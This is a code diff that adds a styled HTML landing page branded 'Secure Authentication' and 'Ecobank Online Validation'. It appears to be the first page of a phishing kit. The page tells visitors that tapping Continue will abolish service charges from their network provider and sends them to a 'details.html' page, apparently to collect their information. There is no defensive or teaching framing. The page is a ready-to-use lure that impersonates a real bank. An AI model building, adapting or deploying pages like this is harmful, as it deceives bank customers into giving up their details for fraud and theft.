@@ -1,1 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Welcome</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", Roboto, Arial, sans-serif;
+      background: linear-gradient(to bottom, #08143a, #0b1d4d);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      color: #fff;
+    }
 
+    /* Header */
+    .header {
+      background: linear-gradient(135deg, #08143a, #0b1d4d);
+      color: #fff;
+      text-align: center;
+      width: 100%;
+      padding: 40px 20px;
+      border-bottom-left-radius: 40px;
+      border-bottom-right-radius: 40px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+    }
+    .header h1 { margin: 0; font-size: 24px; }
+    .header p { margin: 8px 0 0; font-size: 14px; }
+
+    /* Centered box */
+    .notice-box {
+      margin-top: -20px;
+      background: linear-gradient(135deg, #1e2b5b, #24356b);
+      color: #e6ecf9;
+      padding: 25px 20px 20px 20px;
+      max-width: 500px;
+      width: 90%;
+      border-radius: 12px;
+      box-shadow: 0 6px 16px rgba(0,0,0,0.4);
+      font-size: 15px;
+      line-height: 1.6;
+      text-align: center;
+      font-weight: 500;
+      position: relative;
+    }
+
+    .notice-icon {
+      position: absolute;
+      top: 12px;
+      left: 12px;
+      font-size: 20px;
+      color: #4db8ff;
+    }
+
+    /* Continue button */
+    .continue-btn {
+      margin-top: 20px;
+      display: inline-block;
+      padding: 12px 24px;
+      font-size: 16px;
+      font-weight: bold;
+      color: #fff;
+      background: linear-gradient(135deg, #1e90ff, #187bcd);
+      border: none;
+      border-radius: 6px;
+      text-decoration: none;
+      transition: all 0.3s ease;
+    }
+
+    .continue-btn:hover {
+      background: linear-gradient(135deg, #187bcd, #1560a3);
+      transform: scale(1.05);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+
+    @media (max-width: 500px) {
+      .header h1 { font-size: 20px; }
+      .header p { font-size: 12px; }
+      .notice-box { font-size: 14px; padding: 20px 15px; }
+      .notice-icon { font-size: 18px; top: 10px; left: 10px; }
+      .continue-btn { font-size: 14px; padding: 10px 20px; width: 100%; display: block; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <h1>Secure Authentication</h1>
+    <p>Ecobank Online Validation</p>
+  </div>
+
+  <div class="notice-box">
+    <div class="notice-icon">ℹ️</div>
+    <p><strong>Note:</strong> By tapping on <em>Continue</em> you accept all terms and conditions to abolish service charges by your network provider.</p>
+    <a href="details.html" class="continue-btn">Continue</a>
+  </div>
+
+</body>
+</html>
